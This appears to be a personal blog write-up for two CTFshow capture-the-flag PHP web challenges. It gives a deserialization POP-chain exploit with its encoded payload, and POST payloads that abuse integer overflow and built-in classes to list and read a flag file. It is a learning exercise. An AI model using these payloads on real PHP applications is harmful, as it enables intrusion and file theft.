---
title: "CTFshow0222卷王杯 Wp"
slug: "ctfshow-0222-juanwangcup-wp"
description: "属实懒狗，就俩题拖了一个月才做"
date: 2022-03-28T10:04:27+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

## easy unserialize

一个pop链的构造和throw error的绕过

```php
<?php
$talk = '111';
$flag = 'flag{here}';

class one {
    public $object; // new second();

    public function MeMeMe() {
        array_walk($this, function($fn, $prev){
            if ($fn[0] === "Happy_func" && $prev === "year_parm") {
                echo 'success';
                global $talk;
                echo "$talk"."</br>";
                global $flag;
                echo $flag; // get flag here  [7]
            }
        });
    }

    public function __destruct() {
        @$this->object->add();  // second::__call  [1]
    }

    public function __toString() {
        return $this->object->string;   // third::__get  [4]
    }
}

class second {
    protected $filename;    // new one();

    public function __construct($filename){
        $this->filename = $filename;
    }

    protected function addMe() {
        return "Wow you have sovled".$this->filename;   // one::__toString  [3]
    }

    public function __call($func, $args) {  // 不存在方法
        call_user_func([$this, $func."Me"], $args); // second::addMe  [2]
        // one::MeMeMe  [6]
    }
}

class third {
    private $string;

    public function __construct($string) {	// 构造pop时注意手动添加这个构造方法 或者直接赋值也可
        $this->string = $string;
    }

    public function __get($name) {  // 不存在属性
        $var = $this->$name;
        $var[$name]();  // second::__call  [5]
    }
}

$one = new one();
$one2 = new one();
$one3 = new one();
$third = new third(['string'=>[$one3, 'MeMeMe']]);
$one2->object = $third;
$second = new second($one2);
$one3->year_parm = ['Happy_func'];
$one->object = $second;

// unserialize(serialize($one));

$r = [$one, null];
echo urlencode(serialize($r));
```

修改`i:0`

```
a%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A0%3BN%3B%7D
```

![image-20220328095807012](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220328095807012.png)

## easyweb

页面源码提示`/?source`

```php+HTML
<?php
error_reporting(0);
if(isset($_GET['source'])){
    highlight_file(__FILE__);
    echo "\$flag_filename = 'flag'.md5(???).'php';";
    die();
}
if(isset($_POST['a']) && isset($_POST['b']) && isset($_POST['c'])){
    $c = $_POST['c'];
    $count[++$c] = 1;
    if($count[] = 1) {	// ???
        $count[++$c] = 1;
        print_r($count);
        die();
    }else{
        $a = $_POST['a'];
        $b = $_POST['b'];
        echo new $a($b);	// 原生类
    }
}
?>
```

原生类我知道，但是我注释`???`的地方卡了好久，后来知道这里考的是数组溢出（淦

```
c=9223372036854775806&a=DirectoryIterator&b=glob://flag[0-9a-z]*.php
```

```
c=9223372036854775806&a=SplFileObject&b=flag56ea8b83122449e814e0fd7bfb5f220a.php
```

![image-20220328100255829](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220328100255829.png)

------

不摆烂从我做起（x
